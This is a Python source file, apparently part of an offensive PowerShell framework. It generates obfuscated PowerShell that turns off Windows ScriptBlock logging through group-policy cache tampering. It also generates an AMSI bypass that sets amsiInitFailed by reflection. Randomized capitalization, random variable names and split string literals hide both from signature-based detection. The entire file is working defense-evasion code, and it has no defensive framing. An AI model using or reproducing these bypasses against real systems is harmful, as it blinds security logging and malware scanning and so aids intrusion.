import helpers


def scriptBlockLogBypass():
    # ScriptBlock Logging bypass
    bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.Utils'"
    bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
    bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
    bypass += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
    bypass += "('EnableScriptB'+'lockLogging',0);"
    bypass += helpers.randomize_capitalization("$val.Add")
    bypass += "('EnableScriptBlockInvocationLogging',0);"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("=$val}")
    bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
    bypass += "'signatures','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
    return bypass


def AMSIBypass():
    # @mattifestation's AMSI bypass
    bypass = helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.AmsiUtils'"
    bypass += helpers.randomize_capitalization(');$Ref.GetField(')
    bypass += "'amsiInitFailed','NonPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,$true);")
    return bypass
